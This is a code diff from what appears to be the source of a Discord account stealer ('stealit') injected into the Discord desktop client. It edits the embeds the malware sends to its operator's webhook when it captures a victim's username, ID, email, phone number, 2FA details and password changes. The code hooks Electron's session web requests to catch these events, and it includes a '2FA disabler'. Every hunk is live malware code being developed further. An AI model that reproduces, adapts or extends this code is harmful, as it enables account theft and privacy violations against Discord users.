@@ -560,7 +560,7 @@ const FirstTime = async () => {
         fields: [
           {
             name: "Injection Info",
-            value: `\`\`\`diff\n- PC Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
+            value: `- Injection Path: ${client_discord}`,
             inline: !1,
           },
         ],
@@ -604,14 +604,9 @@ const FirstTime = async () => {
         description: `- Injection Path: ${client_discord}`,
         fields: [
           {
-            name: "Username <:mention:1206228892629864488>",
-            value: `\`${user.username}#${user.discriminator}\``,
-            inline: true,
-          },
-          {
-            name: "ID <:identy:1206228345407406120>",
-            value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-            inline: true,
+            name: "User <:identy:1206228345407406120>",
+            value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+            inline: false,
           },
           {
             name: "Nitro <:nitros:1206229096128843837>",
@@ -713,14 +708,9 @@ const FirstTime = async () => {
           description: `- Injection Path: ${client_discord}`,
           fields: [
             {
-              name: "Username <:mention:1206228892629864488>",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: true,
-            },
-            {
-              name: "ID <:identy:1206228345407406120>",
-              value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-              inline: true,
+              name: "User <:identy:1206228345407406120>",
+              value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+              inline: false,
             },
             {
               name: "Nitro <:nitros:1206229096128843837>",
@@ -1768,14 +1758,9 @@ electron.session.defaultSession.webRequest.onCompleted(
                 description: `- Injection Path: ${client_discord}`,
                 fields: [
                   {
-                    name: "Username <:mention:1206228892629864488>",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: true,
-                  },
-                  {
-                    name: "ID <:identy:1206228345407406120>",
-                    value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                    inline: true,
+                    name: "User <:identy:1206228345407406120>",
+                    value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                    inline: false,
                   },
                   {
                     name: "Nitro <:nitros:1206229096128843837>",
@@ -1868,9 +1853,9 @@ electron.session.defaultSession.webRequest.onCompleted(
               description: `- Injection Path: ${client_discord}`,
               fields: [
                 {
-                  name: "User <:mention:1206228892629864488>",
-                  value: `@${user.username}#${user.discriminator} - \`${user.id}\` ${GetLangue(user.locale)}`,
-                  inline: true,
+                  name: "User <:identy:1206228345407406120>",
+                  value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                  inline: false,
                 },
                 {
                   name: "Nitro <:nitros:1206229096128843837>",
@@ -1937,17 +1922,12 @@ electron.session.defaultSession.webRequest.onCompleted(
             title:
               "<:stealit:1206869154691416084> Detect Password Changed",
             color: config["embed-color"],
-            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
+            description: `- Injection Path: ${client_discord}`,
             fields: [
               {
-                name: "Username <:mention:1206228892629864488>",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: true,
-              },
-              {
-                name: "ID <:identy:1206228345407406120>",
-                value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                inline: true,
+                name: "User <:identy:1206228345407406120>",
+                value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                inline: false,
               },
               {
                 name: "Nitro <:nitros:1206229096128843837>",
@@ -1972,11 +1952,6 @@ electron.session.defaultSession.webRequest.onCompleted(
               {
                 name: "Email <:mail:1206251253567455314>",
                 value: `\`${user.email}\``,
-                inline: true,
-              },
-              {
-                name: "Phone <:iphone:1206253352439255051>",
-                value: `\`${user.phone ?? "None"}\``,
                 inline: true,
               },
               {
@@ -2091,14 +2066,9 @@ electron.session.defaultSession.webRequest.onCompleted(
             description: `- Injection Path: ${client_discord}`,
             fields: [
               {
-                name: "Username <:mention:1206228892629864488>",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: true,
-              },
-              {
-                name: "ID <:identy:1206228345407406120>",
-                value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                inline: true,
+                name: "User <:identy:1206228345407406120>",
+                value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                inline: false,
               },
               {
                 name: "Nitro <:nitros:1206229096128843837>",
@@ -2185,14 +2155,9 @@ electron.session.defaultSession.webRequest.onCompleted(
                 color: config["embed-color"],
                 fields: [
                   {
-                    name: "ID <:identy:1206228345407406120>",
-                    value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-                    inline: true,
-                  },
-                  {
-                    name: "Username <:username:1041634536733290596>",
-                    value: `\`${user.username}#${user.discriminator}\``,
-                    inline: true,
+                    name: "User <:identy:1206228345407406120>",
+                    value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+                    inline: false,
                   },
                   {
                     name: "2FA <:keys:1206229927507136574>",
@@ -2266,14 +2231,9 @@ electron.session.defaultSession.webRequest.onCompleted(
           color: config["embed-color"],
           fields: [
             {
-              name: "Username <:username:1041634536733290596>",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: true,
-            },
-            {
-              name: "ID <:identy:1206228345407406120>",
-              value: `\`${user.id}\`\n[Copy ID](https://stealit.vercel.app/?p=${user.id})`,
-              inline: true,
+              name: "User <:identy:1206228345407406120>",
+              value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+              inline: false,
             },
             {
               name: "2FA disabler Response <:2FA:982994698278952980>",
@@ -2316,9 +2276,9 @@ electron.session.defaultSession.webRequest.onCompleted(
           color: config["embed-color"],
           fields: [
             {
-              name: "Username <:username:1041634536733290596>",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: true,
+              name: "User <:identy:1206228345407406120>",
+              value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+              inline: false,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
@@ -2374,9 +2334,9 @@ electron.session.defaultSession.webRequest.onCompleted(
           color: config["embed-color"],
           fields: [
             {
-              name: "Username <:username:1041634536733290596>",
-              value: `\`${user.username}#${user.discriminator}\``,
-              inline: true,
+              name: "User <:identy:1206228345407406120>",
+              value: `<:mention:1206228892629864488>${user.username} - \`${user.id}\` ${GetLangue(user.locale)}`,
+              inline: false,
             },
             {
               name: "2FA <:keys:1206229927507136574>",
